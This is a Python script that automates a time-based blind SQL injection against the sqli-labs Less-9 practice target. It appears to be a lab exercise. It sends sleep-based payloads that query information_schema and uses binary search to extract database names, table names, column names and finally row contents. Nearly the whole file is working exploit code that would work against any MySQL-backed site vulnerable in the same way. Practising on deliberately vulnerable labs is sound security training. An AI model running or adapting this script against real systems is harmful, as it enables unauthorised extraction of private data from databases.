#!/usr/bin/env python3
import requests
import time

url = "http://192.168.1.103/sqli-labs/Less-9/"  # 页面url值
parameter = "?id="  # 参数
database_name = ""
table_name = ""
column_name = ""


def attack(distance, char_index, mid, payload):
    u"""payload生成并进行盲注."""
    startTime = time.time()
    payload = payload.format(distance, char_index, mid)
    print(payload)
    requests.get(payload)
    if (time.time() - startTime >= 2):
        return False
    else:
        return True


def search(name, payload):
    u"""Payload参数生成及结果输出."""
    payload = url + parameter + payload
    for i in range(0, 30):   # 偏移量，用于limit i,1
        content = ""
        count = 0
        for j in range(30):  # 盲注值，用于substr(string,j,1)
            count += 1
            tmp = bin_search(i, j, payload=payload)
            content += tmp
            if tmp == chr(1):
                break
        if (count == 1):
            break
        print(name + ' : ' + content)


def bin_search(distance, char_index, payload, left=0, right=127):
    u"""进行二分搜索."""
    while (left < right):

        mid = int((left + right) / 2)  # 盲注时的对比值
        if attack(str(distance), str(char_index + 1), str(mid), payload):
            left = mid
        else:
            right = mid
        if left == right - 1:
            if attack(str(distance), str(char_index + 1), str(mid), payload):
                mid += 1
                break
            else:
                break
    return chr(mid)


def search_db():
    u"""找到所有数据库."""
    payload = ("1' and if(ascii(substr((select SCHEMA_NAME from "
               "INFORMATION_SCHEMA.SCHEMATA "
               "limit {0},1),{1},1))>{2}, 0, sleep(3))%23")
    search("database", payload)


def search_table():
    u"""找到某数据库中的所有表."""
    global database_name
    database_name = input("please input database_name:\n")

    payload = ("1' and if(ascii(substr((select table_name from"
               " information_schema.tables where table_schema='"
               + database_name +
               "' limit {0},1),{1},1))>{2}, 0, sleep(3)) %23")
    search("table", payload)


def search_column():
    u"""找到某表中的所有列."""
    global table_name
    global database_name
    table_name = input("please input table_name:\n")
    payload = ("1' and if(ascii(substr((select column_name from "
               "information_schema.columns  where table_name='" + table_name
               + "' and table_schema='" + database_name
               + "' limit {0},1),{1},1))>{2}, 0, sleep(3)) %23")
    search("column", payload)


def get_content():
    u"""确定某一列的内容."""
    global table_name
    global database_name
    column_name = input("please input column_name:\n")
    payload = ("1' and if(ascii(substr((select " + column_name + " from "
               + database_name + "." + table_name
               + " limit {0},1),{1},1))>{2}, 0, sleep(3)) %23")
    search("content", payload)


if __name__ == '__main__':
    search_db()
    search_table()
    search_column()
    get_content()
